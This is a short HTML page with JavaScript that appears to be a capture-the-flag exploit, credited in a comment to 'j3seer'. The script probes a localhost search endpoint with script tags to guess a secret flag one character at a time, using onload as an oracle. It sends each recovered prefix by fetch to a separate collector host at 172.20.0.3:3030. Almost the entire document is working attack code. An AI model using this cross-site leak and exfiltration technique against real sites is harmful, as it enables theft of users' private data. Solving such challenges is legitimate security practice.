</html>
<body>
    <script> 
        let flag = "cr3{"
        const exfil_url = "http://172.20.0.3:3030/"
        const probeError = (url, char) => {
            let s = document.createElement('script');
            s.src = url;
            s.onload = () => {
                flag += char
                fetch(exfil_url+"?flag="+encodeURIComponent(flag))
                s.remove()
            };
            document.head.appendChild(s);
            return flag
        };
        

        // note(j3seer) this exploit will exfiltrate only the first 2 chars of the flag 

        var count = 0
        var i = setInterval(()=>{
            for (let c of  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}") {
                probeError("http://localhost:3000/search?username="+encodeURIComponent(flag + c),c);    
            }
            if (++count === 2){
                window.clearInterval(i);

            }
        },2500)

 

    </script>
</body>
</html>